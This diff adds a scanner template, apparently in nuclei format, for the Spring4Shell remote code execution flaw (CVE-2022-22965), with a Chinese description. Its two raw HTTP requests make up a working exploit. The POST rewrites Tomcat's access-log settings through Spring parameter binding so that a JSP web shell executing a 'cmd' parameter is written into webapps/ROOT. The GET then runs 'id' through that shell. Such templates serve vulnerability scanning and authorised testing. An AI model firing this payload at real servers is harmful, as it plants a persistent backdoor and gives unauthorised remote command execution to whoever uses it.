@@ -1,0 +1,43 @@
+id: Spring-1
+
+info:
+  name: Spring Core RCE漏洞
+  author: attempt
+  severity: high
+  description: |
+    Spring core是Spring系列产品中用来负责发现、创建并处理bean之间的关系的一个工具包，是一个包含Spring框架基本的核心工具包，Spring其他组件都要使用到这个包。
+    在Spring框架的JDK9版本（及以上版本）中，远程攻击者可在满足特定条件的基础上，通过框架的参数绑定功能获取AccessLogValve对象并诸如恶意字段值，从而触发pipeline机制并写入任意路径下的文件。
+    漏洞被称为 Spring4Shell 或 SpringShell。
+  reference:
+    - https://github.com/tangxiaofeng7/CVE-2022-22965-Spring-Core-Rce
+  metadata:
+    verified: true
+    max-request: 1
+  tags: Spring,Spring Core,RCE
+request:
+  - raw:
+      - |
+        POST / HTTP/1.1
+        Host: {{RootURL}}
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+        suffix: %>
+        prefix: <%Runtime
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 495
+
+        class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di.getRuntime%28%29.exec%28request.getParameter%28%22cmd%22%29%29%3B%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.prefix=xxxxxxxxxxx
+      - |
+        GET /xxxxxxxxxxx.jsp?cmd=id HTTP/1.1
+        Host: {{RootURL}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+    matchers-condition: and
+    matchers:
+      - type: status
+        part: status_1
+        status:
+          - 200
